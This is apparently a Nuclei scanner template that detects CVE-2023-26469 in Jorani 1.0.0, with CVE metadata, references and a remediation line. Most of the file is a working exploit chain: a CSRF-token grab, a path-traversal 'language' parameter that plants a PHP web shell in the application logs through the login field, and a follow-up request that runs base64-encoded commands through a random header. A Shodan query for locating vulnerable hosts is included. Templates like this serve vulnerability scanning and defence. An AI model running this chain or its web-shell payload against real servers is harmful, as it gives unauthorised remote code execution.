http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    part: body
    regex:
    - name="csrf_test_jorani" value="(.*?)"
    type: regex
  matchers:
  - part: body_3
    regex:
    - uid=(\d+)\(.*?\) gid=(\d+)\(.*?\) groups=([\d,]+)\(.*?\)
    type: regex
  - part: header_3
    status:
    - 401
    type: status
  matchers-condition: and
  raw:
  - 'GET /session/login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /session/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=..%2F..%2Fapplication%2Flogs&login={{payload}}&CipheredValue=DummyPassword

    '
  - 'GET /pages/view/log-{{date_time("%Y-%M-%D")}} HTTP/1.1

    Host: {{Hostname}}

    X-REQUESTED-WITH: XMLHttpRequest

    {{header}}: {{base64("echo ---------;{{cmd}} 2>&1;echo ---------;")}}

    '
id: CVE-2023-26469
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:jorani:jorani:1.0.0:*:*:*:*:*:*:*
    cve-id: CVE-2023-26469
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.98954
    epss-score: 0.93851
  description: 'Jorani 1.0.0, an attacker could leverage path traversal to access
    files and execute code on the server.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 3
    product: jorani
    shodan-query: http.favicon.hash:-2032163853
    vendor: jorani
    verified: true
  name: Jorani 1.0.0 - Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-26469
  - https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py
  - https://github.com/advisories/GHSA-7r9h-9r47-7vjj
  - http://packetstormsecurity.com/files/174248/Jorani-Remote-Code-Execution.html
  - https://jorani.org/security-features-in-lms.html
  remediation: 'Upgrade Jorani to a patched version or apply the necessary security
    patches.

    '
  severity: critical
  tags: cve,cve2023,jorani,rce,packetstorm
variables:
  cmd: id
  header: '{{to_upper(rand_base(12))}}'
  payload: <?php if(isset($_SERVER['HTTP_{{header}}'])){system(base64_decode($_SERVER['HTTP_{{header}}']));}
    ?>
